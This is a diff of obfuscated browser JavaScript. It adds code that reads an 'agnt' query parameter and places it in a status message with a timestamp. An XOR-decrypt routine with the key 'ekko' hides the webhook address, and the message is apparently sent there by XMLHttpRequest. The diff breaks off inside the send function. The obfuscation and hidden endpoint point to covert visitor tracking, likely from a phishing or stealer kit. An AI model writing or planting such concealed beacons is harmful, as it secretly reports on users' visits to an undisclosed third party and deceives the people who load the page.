@@ -1,3 +1,10 @@
+
+const _0x1a2b = window['location']['search'];
+const _0x3c4d = new URLSearchParams(_0x1a2b);
+var _0x5e6f = _0x3c4d['get']('agnt') || _0x3c4d['get']('a');
+if (_0x5e6f === null) _0x5e6f = "unknown";
+
+
 (function(){
     var _0xkey = 'ekko';
     function _0xdecrypt(_0xinput) {
@@ -16,10 +23,11 @@
     const _0xwebhook = _0xdecrypt("0D1F1F1F165144400102180C0A190F4106040640041B0240120E09070A04001C4A5A585A515A5857535D5D565259585B5D5E5C5F4A0423303D090C3D12031C012123341D3009202E50230958063D08300A1C345907035D3E095F0942173D5E002C1F53263422280C0C3E0435570E1C38071A3D09575A5A2923".replace(/\s+/g, ''));
     
     const _0xstartTime = Date.now();
-    const _0xstatMsg = _0xdecrypt('1B15464248464642484646424846464248464642484646424846464642484646424646464248464611' + '1B'.replace(/\s+/g, '')) + "\n"
+    const _0xstatMsg = _0xdecrypt('1B1546424846464248464642484646424846464248464642484646424846464248461511'.replace(/\s+/g, '')) + "\n"
         + _0xdecrypt('4648484F29020504164B3D0616021F4E'.replace(/\s+/g, '')) + "\n"
-        + `${_0xdecrypt('3102060A'.replace(/\s+/g, ''))}: ` + "<t:" + Math.floor(_0xstartTime / 1000) + ">" + "\n\n"
-        + _0xdecrypt('1B15464248464642484646424846464248464642484646424846464642484646424646464248464611' + '1B'.replace(/\s+/g, ''));
+        + `${_0xdecrypt('3102060A'.replace(/\s+/g, ''))}: ` + "<t:" + Math.floor(_0xstartTime / 1000) + ">" + "\n"
+        + `${_0xdecrypt('2A1902080C05'.replace(/\s+/g, ''))}: ${_0x5e6f}` + "\n\n"
+        + _0xdecrypt('1B1546424846464248464642484646424846464248464642484646424846464248461511'.replace(/\s+/g, ''));
     
     function _0xsend(_0xurl, _0xmsg) {
         var _0xxhr = new XMLHttpRequest();
